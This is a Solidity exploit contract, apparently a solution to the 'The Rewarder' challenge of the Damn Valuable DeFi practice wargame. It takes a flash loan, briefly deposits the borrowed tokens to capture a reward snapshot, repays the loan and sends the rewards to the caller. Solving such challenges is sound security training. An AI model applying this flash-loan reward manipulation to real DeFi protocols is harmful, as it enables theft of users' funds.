// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewarderAttack {
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    DamnValuableToken internal immutable dvtToken;

    address payable attacker;

    constructor(
        address _flPool,
        address _rPool,
        address _dvtToken
    ) {
        flashLoanerPool = FlashLoanerPool(_flPool);
        theRewarderPool = TheRewarderPool(_rPool);
        dvtToken = DamnValuableToken(_dvtToken);
    }

    function attack(uint256 amount) external {
        attacker = payable(msg.sender);
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvtToken.approve(address(theRewarderPool), type(uint256).max);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        dvtToken.transfer(address(flashLoanerPool), amount);
        uint256 rewardAmount = theRewarderPool.rewardToken().balanceOf(
            address(this)
        );
        theRewarderPool.rewardToken().transfer(attacker, rewardAmount);
    }
}
